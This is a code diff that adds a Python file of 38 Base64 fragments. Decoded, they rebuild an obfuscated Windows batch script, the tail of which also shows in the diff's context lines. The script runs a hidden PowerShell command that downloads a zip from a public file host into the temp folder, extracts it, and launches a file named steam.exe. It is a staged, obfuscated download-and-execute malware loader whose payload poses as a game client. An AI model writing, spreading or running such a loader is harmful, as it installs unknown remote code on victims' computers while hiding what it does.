@@ -43,3 +43,65 @@ for /f "delims=" %%J in ('powershell -NoProfile -Command "[System.Text.Encoding]
 
 set "final=%dec1%%dec2%%dec3%%dec4%%dec5%%dec6%%dec7%%dec8%%dec9%%dec10%"
 powershell -w h -noni -nop -c "%final%"
+
+
+
+import base64
+import os
+
+# 50 variables holding chunks of the original base64 string
+part1 = "QGVjaG8gb2ZmCjo6IEVhY2ggdmFyaWFibGXigJlzIHZhbHVlIGlzIHRoZSBCYXNlNjQgZW5jb2"
+part2 = "Rpbmcgb2Ygb25lIHBhcnQgKHVzaW5nIFVURi04KQpzZXQgIlh4QXo9VUc5M1pYSnphR1ZzYkNB"
+part3 = "dGR5Qm9JQzF1YjI1cElDMXViM0FnTFdNZ0lpUjFQU2M9IiAKc2V0ICJZeUIxPWFIUjBjSE02TH"
+part4 = "k4d2VEQjRNQzV6ZEM4NFpsWkxlbWw2Snc9PSIKc2V0ICJaekMyPUpIb2tQWHRsYm5ZNlZFVk5V"
+part5 = "SDBuSzF3bk9HWldTeTU2YVhBbiIgIApzZXQgIlh4RDM9SkdVOUpIdGxiblk2VkVWTlVIMG5LMX"
+part6 = "duWlNjPSIgIApzZXQgIll5RTQ9YVhkeUlDUjFJQzF2SUNSNk93PT0iICAKc2V0ICJaekY1PVJY"
+part7 = "aHdZVzVrTFVGeVkyaHBkbVVnSkhva0lDMW1Pdz09IiAgCnNldCAiWHhHNj1KSE05S0Noblkya2"
+part8 = "dKR1ZmTFhJZ0xXWnBJSE4wWldGdExtVjRaWHh6Wld4bFkzUWdMV1lnTVNrdVJuVnNiRTVoYldV"
+part9 = "NyIgIApzZXQgIll5SDc9YVdZZ0tDUnpLWHM9IiAgCnNldCAiWnpJOD1VM1JoY25RZ0pITT0iIC"
+part10 = "AKc2V0ICJYeEo5PWZRPT0iCgpmb3IgL2YgImRlbGltcz0iICUlQSBpbiAoJ3Bvd2Vyc2hlbGwg"
+part11 = "LU5vUHJvZmlsZSAtQ29tbWFuZCAiW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdH"
+part12 = "JpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnJVh4QXolJykpIicpIGRv"
+part13 = "IHNldCAiZGVjMT0lJUEiCmZvciAvZiAiZGVsaW1zPSIgJSVCIGluICgncG93ZXJzaGVsIC1Ob1"
+part14 = "Byb2ZpbGUgLUNvbW1hbmQgIltTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5n"
+part15 = "KFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJyVaekMyJScpKSInKSBkbyBzZX"
+part16 = "QgImRlYzM9JSVDIgpmb3IgL2YgImRlbGltcz0iICUlRCBpbiAoJ3Bvd2Vyc2hlbGwgLU5vUHJv"
+part17 = "ZmlsZSAtQ29tbWFuZCAiW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1"
+part18 = "N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnJVh4RDMlJykpIicpIGRvIHNldCAi"
+part19 = "ZGVjND0lJUQiCmZvciAvZiAiZGVsaW1zPSIgJSVFIGluICgncG93ZXJzaGVsbCAtTm9Qcm9maW"
+part20 = "xlIC1Db21tYW5kICJbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lz"
+part21 = "dGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCclWXlFNCUnKSkiJykgZG8gc2V0ICJkZW"
+part22 = "M1PSUlRSIKZm9yIC9mICJkZWxpbXM9IiAlJUYgaW4gKCdwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUg"
+part23 = "LUNvbW1hbmQgIltTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW"
+part24 = "0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJyVaekY1JScpKSInKSBkbyBzZXQgImRlYzY9"
+part25 = "JSVGIgpmb3IgL2YgImRlbGltcz0iICUlRyBpbiAoJ3Bvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtQ2"
+part26 = "9tbWFuZCAiW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5D"
+part27 = "b252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnJVh4RzYlJykpIicpIGRvIHNldCAiZGVjNz0lJU"
+part28 = "ciCmZvciAvZiAiZGVsaW1zPSIgJSVIIGluICgncG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Db21t"
+part29 = "YW5kICJbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbn"
+part30 = "ZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCclWXlINyUnKSkiJykgZG8gc2V0ICJkZWM4PSUlSCIK"
+part31 = "Zm9yIC9mICJkZWxpbXM9IiAlJUkgaW4gKCdwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLUNvbW1hbm"
+part32 = "QgIltTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVy"
+part33 = "dF06OkZyb21CYXNlNjRTdHJpbmcoJyVaekk4JScpKSInKSBkbyBzZXQgImRlYzk9JSVJIgpmb3"
+part34 = "IgL2YgImRlbGltcz0iICUlSiBpbiAoJ3Bvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtQ29tbWFuZCAi"
+part35 = "W1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XT"
+part36 = "o6RnJvbUJhc2U2NFN0cmluZygnJVh4SjklJykpIicpIGRvIHNldCAiZGVjMTA9JSVKIgoKc2V0"
+part37 = "ICJmaW5hbD0lZGVjMSUlZGVjMiUlZGVjMyUlZGVjNCUlZGVjNSUlZGVjNiUlZGVjNyUlZGVjOC"
+part38 = "UlZGVjOSUlZGVjMTAlIgpwb3dlcnNoZWxsIC13IGggLW5vbmkgLW5vcCAtYyAiJWZpbmFsJSI="
+
+# Put all parts into a list
+parts = [
+    part1, part2, part3, part4, part5, part6, part7, part8, part9, part10,
+    part11, part12, part13, part14, part15, part16, part17, part18, part19, part20,
+    part21, part22, part23, part24, part25, part26, part27, part28, part29, part30,
+    part31, part32, part33, part34, part35, part36, part37, part38
+]
+
+# Combine and decode
+final_base64 = ''.join(parts)
+final_command = base64.b64decode(final_base64).decode('utf-8')
+
+# Print or run the result
+print(final_command)  # for debugging
+# os.system(final_command)  # uncomment to run
+
